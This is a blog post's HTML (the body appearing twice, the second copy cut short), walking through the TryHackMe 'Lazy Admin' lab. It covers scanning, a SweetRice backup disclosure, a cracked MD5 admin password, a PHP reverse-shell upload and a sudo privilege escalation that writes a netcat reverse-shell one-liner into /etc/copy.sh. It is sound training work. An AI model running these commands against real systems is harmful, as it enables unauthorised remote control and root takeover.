@@ -1,0 +1,997 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="This is my personal website. The purpose of the Website is to assist and monitor my own development.">
+<meta name="google-site-verification" content="NeMnHGyDeeJqt9s_pg03TI1foYUOvLwrHreqLj_mgRE">
+<meta name="language" content="en">
+
+<!-- Twitter And Open Graph Meta -->
+<!-- Open Graph Meta Tags -->
+<meta property="og:title" content="TryHackMe - Lazy Admin">
+<meta property="og:description" content="&lt;p&gt;Easy linux machine to practice your skills&lt;/p&gt;
+">
+<meta property="og:type" content="website">
+<meta property="og:url" content="http://localhost:4000/tryhackme-lazy-admin/">
+<meta property="og:image" content="">
+<meta property="og:image:alt" content="">
+<meta property="og:site_name" content="Mr0Wido's Blog">
+<meta property="og:locale" content="en_US">
+
+<!-- Twitter Meta Tags -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@">
+<meta name="twitter:title" content="TryHackMe - Lazy Admin">
+<meta name="twitter:description" content="&lt;p&gt;Easy linux machine to practice your skills&lt;/p&gt;
+">
+<meta name="twitter:image" content="">
+
+
+<!-- css -->
+<link rel="shortcut icon" href="/assets/img/favicon.ico" type="ico">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<link rel="canonical" href="http://localhost:4000/tryhackme-lazy-admin/">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+<title>TryHackMe - Lazy Admin - Mr0Wido's Blog</title>
+
+
+
+<!-- Script -->
+<script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+<script src="https://kit.fontawesome.com/d54796acd1.js" crossorigin="anonymous"></script>
+
+
+
+
+
+    <title>TryHackMe - Lazy Admin - Mr0Wido's Blog</title>
+    <link rel="stylesheet" type="text/css" href="/assets/css/main.css">
+  <script src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">MathJax.Hub.Config({         tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] }       });</script>
+</head>
+  <body>
+    <header class="site-header">
+  <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
+  <div class="site-title">
+    <a href="http://localhost:4000">Mr0Wido's Blog</a>
+  </div>
+  <nav class="site-nav">
+    <ul class="site-nav__list">
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/">Home</a>
+      </li>
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/whoami/">Whoami</a>
+      </li>
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/posts/">Posts</a>
+      </li>
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/projects/">Projects</a>
+      </li>
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/cv/">CV</a>
+      </li>
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/categories/">Categories</a>
+      </li>
+      <li class="site-nav__item">
+        <div class="search">
+          <input type="text" id="search-input" placeholder="Search...">
+          <i class="fas fa-search"></i>
+          <ul id="results-container"></ul>
+        </div>
+      </li>
+    </ul>
+  </nav>
+</header>
+
+
+<!-- 360 to 980 -->
+<header class="header-mobile">
+  <div class="header-inner clearfix">
+    <div class="nav-btn nav-slider">
+      <i class="fa-solid fa-bars"></i>
+    </div>
+    <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
+    <div class="site-title">
+      <a href="http://localhost:4000">Mr0Wido's Blog</a>
+    </div>
+  </div>
+</header>
+<nav class="sidebar">
+  <div class="nav-header">
+    <div class="nav-search">
+      <div class="search">
+        <i class="fas fa-search"></i>
+        <input type="search" name="search" id="search-input" placeholder="Search...">
+        <ul id="results-container"></ul>
+      </div>
+    </div>
+  </div>
+  <ul class="nav-categories ul-base">
+    <li><a class="site-nav__link " href="/">Home</a></li>
+    <li><a class="site-nav__link " href="/whoami/">Whoami</a></li>
+    <li><a class="site-nav__link " href="/posts/">Posts</a></li>
+    <li><a class="site-nav__link " href="/projects/">Projects</a></li>
+    <li><a class="site-nav__link " href="/cv/">CV</a></li>
+    <li><a class="site-nav__link " href="/categories/">Categories</a></li>
+  </ul>
+  <ul class="social ul-base">
+    <li><a href="https://twitter.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i></a></li>
+    <li><a href="https://instagram.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i></a></li>
+    <li><a href="https://www.linkedin.com/in/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a></li>
+    <li><a href="https://github.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i></a></li>
+  </ul>
+  <div class="copyright">
+    <span> © Copyright 2023 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a></span>
+  </div>
+</nav>
+<div class="overlay"></div>
+    
+    <div class="container-default">
+      <div class="content-container">
+        <main class="default">
+          <div class="post">
+  <h1 class="post__title">TryHackMe - Lazy Admin</h1>
+  <div class="post__content">
+    <p>Easy linux machine to practice your skills</p>
+
+<p><br></p>
+
+<h2 id="1-lazy-admin">1. Lazy Admin</h2>
+
+<p>Have some fun! There might be multiple ways to get user access.</p>
+
+<p><br></p>
+
+<h3 id="11-what-is-the-user-flag">1.1 What is the user flag?</h3>
+
+<p>Let’s do a nmap scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.221.70
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/nmap.png" alt="nmap"></p>
+
+<p>Two ports are open. These are <strong><code class="language-plaintext highlighter-rouge">22/tcp SSH and 80/tcp HTTP</code></strong>.</p>
+
+<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
+
+<p>I see an apache default page on the website.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/apache.png" alt="apache"></p>
+
+<p>Let’s do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan for the website.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.221.70/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/gobuster-one.png" alt="gobuster-one"></p>
+
+<p>We found the  <code class="language-plaintext highlighter-rouge">/content/</code> directory. Let’s go to the directory.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/content.png" alt="content"></p>
+
+<p>This website uses <code class="language-plaintext highlighter-rouge">SweetRice</code> and it seems to be closed.</p>
+
+<p>So, I try another gobuster scan on this directory.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.221.70/content/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/gobuster-content.png" alt="gobuster-content"></p>
+
+<p>We found a few directories here. Let’s examine all directories.</p>
+
+<ul>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">/inc/</code></strong></em></p>
+
+    <p>We found a lot of files in this directory.</p>
+
+    <p><img src="/assets/img/tryhackme/lazy-admin/inc.png" alt="inc"></p>
+
+    <p>I found lastest.txt. It seems <code class="language-plaintext highlighter-rouge">SweetRice's</code> running version is <code class="language-plaintext highlighter-rouge">1.5.1.</code> Maybe this version is vulnerable.</p>
+
+    <p><img src="/assets/img/tryhackme/lazy-admin/lastest.png" alt="lastest"></p>
+  </li>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">/as/</code></strong></em></p>
+
+    <p>We found a login page here.</p>
+
+    <p><img src="/assets/img/tryhackme/lazy-admin/as.png" alt="as"></p>
+  </li>
+</ul>
+
+<p><br></p>
+
+<p>I searched SweetRice in <a href="https://www.exploit-db.com/" rel="external nofollow noopener" target="_blank">exploit-db</a>.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/search.png" alt="search"></p>
+
+<p>I am looking to the first. <a href="https://www.exploit-db.com/exploits/40718" rel="external nofollow noopener" target="_blank">SweetRice 1.5.1 - Backup Disclosure</a></p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/first.png" alt="first"></p>
+
+<p>According to the vulnerability, there is a msql_backup file under the /inc/ directory.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/say.png" alt="say"></p>
+
+<p>Let’s go and see.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/back.png" alt="back"></p>
+
+<p>Let’s go to the /mysql_backup/ directory.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/sql-file.png" alt="sql-file"></p>
+
+<p>Let’s see what’s inside this file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat mysql_bakup_20191129023059-1.5.1.sql
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/sql-inside.png" alt="sql-inside"></p>
+
+<p>We found two important things here.</p>
+
+<p><em><strong><code class="language-plaintext highlighter-rouge">Admin: manager</code></strong></em></p>
+
+<p><em><strong><code class="language-plaintext highlighter-rouge">Passwd: 42f749ade7f9e195bf475f37a44cafcb</code></strong></em></p>
+
+<p>It seems the password is a hash. Let’s identify and crack this hash.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/hash-id.png" alt="hash-id"></p>
+
+<p>This password is encrypted using <strong><code class="language-plaintext highlighter-rouge">MD5</code></strong>.</p>
+
+<p>Let’s crack. <a href="https://md5decrypt.net/" rel="external nofollow noopener" target="_blank">https://md5decrypt.net/</a></p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/crack-hash.png" alt="crack-hash"></p>
+
+<p><em><strong><code class="language-plaintext highlighter-rouge">Passwd: Password123</code></strong></em></p>
+
+<p>Now we can log in as an admin user. Let’s go to the /as/ directory and log in.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/home.png" alt="home"></p>
+
+<p>Now we can upload a reverse shell. So, I download pentest monkey’s <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" rel="external nofollow noopener" target="_blank">php-reverse-shell.php</a> and edit the php file. <code class="language-plaintext highlighter-rouge">($ip and $port)</code></p>
+
+<p>Then we go to the Post &gt; Create</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/post-create.png" alt="post-create"></p>
+
+<p>After, we can add a file below the page. (.php file isn’t working you must change the extension.)</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/below.png" alt="below"></p>
+
+<p>After the upload, the page looks like this.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/upload.png" alt="upload"></p>
+
+<p>Now, we set up a netcat listener.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444 
+</code></pre></div></div>
+
+<p>Then we go to the <a href="http://10.10.103.31/content/attachment/shell.phtml" rel="external nofollow noopener" target="_blank">http://10.10.103.31/content/attachment/shell.phtml</a></p>
+
+<p>And we are inside.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/inside.png" alt="inside"></p>
+
+<p>Now, let’s get to the user flag.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/user-flag.png" alt="user-flag"></p>
+
+<p><br></p>
+
+<h3 id="12-what-is-the-root-flag">1.2 What is the root flag?</h3>
+
+<p>Very surprisingly for www-data, we have sudo privileges.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/sudo-l.png" alt="sudo-l"></p>
+
+<p>The backup script is a Perl script that calls /etc/copy.sh</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/copy.png" alt="copy"></p>
+
+<p>Now we edit this copy.sh, file to get the root privilege.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 5555 &gt;/tmp/f" &gt; /etc/copy.sh 
+</code></pre></div></div>
+
+<p>Let’s setup a netcat listener.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 5555 
+</code></pre></div></div>
+
+<p>Let’s run the backup.pl file and get the root privilege.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo perl /home/itguy/backup.pl
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/privesc.png" alt="privesc"></p>
+
+<p>We are inside. Let’s get the root flag.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/root-flag.png" alt="root-flag"></p>
+
+<p><br></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br></p>
+
+  </div>
+  <div class="post__footer">
+    <p class="post__date">
+      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 28, 2023</p>
+    <div class="post__categories">
+      
+      
+      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
+            
+    </div>      
+    
+    <div class="post__tags">
+      <p class="post__tags-title">
+        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
+        <span class="post__tags-container">
+          
+          <span class="post__tags-item">security, linux</span>
+          
+        </span>
+      </p>
+    </div>
+    
+  </div>
+</div>
+<br>
+
+
+<div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    this.page.url = 'http://localhost:4000/tryhackme-lazy-admin/';
+    this.page.identifier = '/tryhackme-lazy-admin';
+    
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by Disqus.</a>
+</noscript>
+
+
+
+        </main>
+      </div>
+      <div class="author-container">
+        
+
+
+<div itemscope itemtype="https://schema.org/Person" class="author-card">
+
+  
+    <div class="author__avatar">
+        <img src="/assets/img/avatar.jpg" alt="Mr0Wido's Blog" itemprop="image" class="u-photo">
+    </div>
+  
+  <div class="author__content-head">
+    <div class="author__content">
+      <h3 class="author__name p-name" itemprop="name">
+        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
+      </h3>
+      
+        <div class="author__bio p-note" itemprop="description">
+          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>
+
+        </div>
+      
+    </div>
+  
+    <div class="author__urls-wrapper">
+      <ul class="author__urls social-icons">
+        
+          
+            
+              <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+            
+          
+            
+              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+            
+          
+            
+              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+            
+          
+            
+              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+            
+          
+            
+              <li><a href="https://www.linkedin.com/in/furkan-deniz-0b4389267" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+            
+          
+        
+  
+        
+  
+        
+          <li>
+            <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
+              <meta itemprop="email" content="mr0wido@protonmail.com">
+              <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+            </a>
+          </li>
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+      </ul>
+    </div>
+  </div>
+  <div class="author__content-head-medium">
+    <div class="author__content">
+      <h3 class="author__name p-name" itemprop="name">
+        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
+      </h3>
+      
+        <div class="author__bio p-note" itemprop="description">
+          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>
+
+        </div>
+      
+      <div class="author__urls-wrapper">
+        <ul class="author__urls social-icons">
+          
+            
+              
+                <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+              
+            
+              
+                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+              
+            
+              
+                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+              
+            
+              
+                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+              
+            
+              
+                <li><a href="https://www.linkedin.com/in/furkan-deniz-0b4389267" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+              
+            
+          
+    
+          
+    
+          
+            <li>
+              <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
+                <meta itemprop="email" content="mr0wido@protonmail.com">
+                <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+              </a>
+            </li>
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+        </ul>
+      </div>
+    </div>
+  
+
+  </div>
+</div>
+
+      </div>
+    </div>
+
+    <div class="container-medium">
+      <div class="author-container">
+        
+
+
+<div itemscope itemtype="https://schema.org/Person" class="author-card">
+
+  
+    <div class="author__avatar">
+        <img src="/assets/img/avatar.jpg" alt="Mr0Wido's Blog" itemprop="image" class="u-photo">
+    </div>
+  
+  <div class="author__content-head">
+    <div class="author__content">
+      <h3 class="author__name p-name" itemprop="name">
+        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
+      </h3>
+      
+        <div class="author__bio p-note" itemprop="description">
+          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>
+
+        </div>
+      
+    </div>
+  
+    <div class="author__urls-wrapper">
+      <ul class="author__urls social-icons">
+        
+          
+            
+              <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+            
+          
+            
+              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+            
+          
+            
+              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+            
+          
+            
+              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+            
+          
+            
+              <li><a href="https://www.linkedin.com/in/furkan-deniz-0b4389267" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+            
+          
+        
+  
+        
+  
+        
+          <li>
+            <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
+              <meta itemprop="email" content="mr0wido@protonmail.com">
+              <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+            </a>
+          </li>
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+      </ul>
+    </div>
+  </div>
+  <div class="author__content-head-medium">
+    <div class="author__content">
+      <h3 class="author__name p-name" itemprop="name">
+        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
+      </h3>
+      
+        <div class="author__bio p-note" itemprop="description">
+          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>
+
+        </div>
+      
+      <div class="author__urls-wrapper">
+        <ul class="author__urls social-icons">
+          
+            
+              
+                <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+              
+            
+              
+                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+              
+            
+              
+                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+              
+            
+              
+                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+              
+            
+              
+                <li><a href="https://www.linkedin.com/in/furkan-deniz-0b4389267" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+              
+            
+          
+    
+          
+    
+          
+            <li>
+              <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
+                <meta itemprop="email" content="mr0wido@protonmail.com">
+                <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+              </a>
+            </li>
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+        </ul>
+      </div>
+    </div>
+  
+
+  </div>
+</div>
+
+      </div>
+      <div class="content-container">
+        <main class="default">
+          <div class="post">
+  <h1 class="post__title">TryHackMe - Lazy Admin</h1>
+  <div class="post__content">
+    <p>Easy linux machine to practice your skills</p>
+
+<p><br></p>
+
+<h2 id="1-lazy-admin">1. Lazy Admin</h2>
+
+<p>Have some fun! There might be multiple ways to get user access.</p>
+
+<p><br></p>
+
+<h3 id="11-what-is-the-user-flag">1.1 What is the user flag?</h3>
+
+<p>Let’s do a nmap scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.221.70
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/nmap.png" alt="nmap"></p>
+
+<p>Two ports are open. These are <strong><code class="language-plaintext highlighter-rouge">22/tcp SSH and 80/tcp HTTP</code></strong>.</p>
+
+<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
+
+<p>I see an apache default page on the website.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/apache.png" alt="apache"></p>
+
+<p>Let’s do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan for the website.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.221.70/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/gobuster-one.png" alt="gobuster-one"></p>
+
+<p>We found the  <code class="language-plaintext highlighter-rouge">/content/</code> directory. Let’s go to the directory.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/content.png" alt="content"></p>
+
+<p>This website uses <code class="language-plaintext highlighter-rouge">SweetRice</code> and it seems to be closed.</p>
+
+<p>So, I try another gobuster scan on this directory.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.221.70/content/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/gobuster-content.png" alt="gobuster-content"></p>
+
+<p>We found a few directories here. Let’s examine all directories.</p>
+
+<ul>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">/inc/</code></strong></em></p>
+
+    <p>We found a lot of files in this directory.</p>
+
+    <p><img src="/assets/img/tryhackme/lazy-admin/inc.png" alt="inc"></p>
+
+    <p>I found lastest.txt. It seems <code class="language-plaintext highlighter-rouge">SweetRice's</code> running version is <code class="language-plaintext highlighter-rouge">1.5.1.</code> Maybe this version is vulnerable.</p>
+
+    <p><img src="/assets/img/tryhackme/lazy-admin/lastest.png" alt="lastest"></p>
+  </li>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">/as/</code></strong></em></p>
+
+    <p>We found a login page here.</p>
+
+    <p><img src="/assets/img/tryhackme/lazy-admin/as.png" alt="as"></p>
+  </li>
+</ul>
+
+<p><br></p>
+
+<p>I searched SweetRice in <a href="https://www.exploit-db.com/" rel="external nofollow noopener" target="_blank">exploit-db</a>.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/search.png" alt="search"></p>
+
+<p>I am looking to the first. <a href="https://www.exploit-db.com/exploits/40718" rel="external nofollow noopener" target="_blank">SweetRice 1.5.1 - Backup Disclosure</a></p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/first.png" alt="first"></p>
+
+<p>According to the vulnerability, there is a msql_backup file under the /inc/ directory.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/say.png" alt="say"></p>
+
+<p>Let’s go and see.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/back.png" alt="back"></p>
+
+<p>Let’s go to the /mysql_backup/ directory.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/sql-file.png" alt="sql-file"></p>
+
+<p>Let’s see what’s inside this file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat mysql_bakup_20191129023059-1.5.1.sql
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/sql-inside.png" alt="sql-inside"></p>
+
+<p>We found two important things here.</p>
+
+<p><em><strong><code class="language-plaintext highlighter-rouge">Admin: manager</code></strong></em></p>
+
+<p><em><strong><code class="language-plaintext highlighter-rouge">Passwd: 42f749ade7f9e195bf475f37a44cafcb</code></strong></em></p>
+
+<p>It seems the password is a hash. Let’s identify and crack this hash.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/hash-id.png" alt="hash-id"></p>
+
+<p>This password is encrypted using <strong><code class="language-plaintext highlighter-rouge">MD5</code></strong>.</p>
+
